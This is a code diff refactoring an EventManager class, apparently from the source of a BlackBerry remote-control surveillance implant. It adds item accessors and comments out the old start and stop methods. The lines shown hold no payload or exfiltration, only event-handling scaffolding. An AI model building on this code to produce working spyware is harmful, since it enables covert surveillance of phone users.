@@ -12,8 +12,11 @@ import java.util.Vector;
 
 import com.ht.rcs.blackberry.event.Event;
 import com.ht.rcs.blackberry.interfaces.Singleton;
+import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
+import com.ht.rcs.blackberry.utils.StartStopThread;
+import com.ht.rcs.blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -47,23 +50,31 @@ public final class EventManager extends Manager implements Singleton {
         super();
     }
 
-    /*
-     * (non-Javadoc)
-     * 
-     * @see com.ht.rcs.blackberry.Manager#ReStart(int)
-     */
-    public synchronized boolean reStart(int type) {
-
-        return true;
+   
+    /*public boolean enabled(int id)
+    {
+        return statusObj.isValidEvent(id);
     }
+    */
+    public Vector getAllItems() {
+        Vector events = statusObj.getEventsList();
+        return events;
+    }
+
+    public StartStopThread getItem(int id) {
+        Event event = statusObj.getEvent(id);
+        Check.ensures(event.eventId == id, "Wrong id");
+        return event;
+    }
+
 
     /*
      * (non-Javadoc)
      * 
      * @see com.ht.rcs.blackberry.Manager#Start(int)
      */
-    public synchronized boolean start(int eventId) {
-        if (statusObj.isValidEvent(eventId) == false) {
+    /*public synchronized boolean startOld(int eventId) {
+        if (!enabled(eventId)) {
             debug.error("EventManager Start FAILED [0] " + eventId);
             return false;
         }
@@ -76,33 +87,35 @@ public final class EventManager extends Manager implements Singleton {
         }
 
         event.start();
-        debug.trace("Start() OK");
+        debug.trace("Start() OK: " + event);
         return true;
     }
-
+*/
     /*
      * (non-Javadoc)
      * 
      * @see com.ht.rcs.blackberry.Manager#StartAll()
      */
-    public synchronized boolean startAll() {
+   /* public synchronized boolean startAllOld() {
         Vector events = statusObj.getEventsList();
 
-        for (int i = 0; i < events.size(); i++) {
+        for (int i = 0; i < events.size(); i++) {            
             Event event = (Event) events.elementAt(i);
-            event.start();
+            Check.asserts(event.eventId == i, "Wrong eventId");
+            event.start();     
+            Utils.sleep(100);
         }
 
-        debug.trace("StartAll() OK\n");
+        debug.trace("StartAll() OK");
         return true;
-    }
+    }*/
 
     /*
      * (non-Javadoc)
      * 
      * @see com.ht.rcs.blackberry.Manager#Stop(int)
      */
-    public synchronized int stop(int eventId) {
+   /* public synchronized int stopOld(int eventId) {
         if (statusObj.stopEvent(eventId) == false) {
             debug.trace("StopEvent() Event already stopped");
             return Common.EVENT_STOPPED;
@@ -118,7 +131,7 @@ public final class EventManager extends Manager implements Singleton {
 
         boolean ret = statusObj.reEnableAgent(eventId);
         return ret ? 1 : 0;
-    }
+    }*/
 
     // CRITICAL - L'handle del thread dell'agente verra' chiuso soltanto dalla
     // StopAgents() al primo
@@ -130,7 +143,7 @@ public final class EventManager extends Manager implements Singleton {
      * 
      * @see com.ht.rcs.blackberry.Manager#StopAll()
      */
-    public synchronized int stopAll() {
+  /*  public synchronized int stopAllOld() {
         Vector events = statusObj.getEventsList();
 
         for (int i = 0; i < events.size(); i++) {
@@ -139,6 +152,8 @@ public final class EventManager extends Manager implements Singleton {
 
         debug.trace("StopAll() OK\n");
         return 0;
-    }
+    }*/
+
+
 
 }
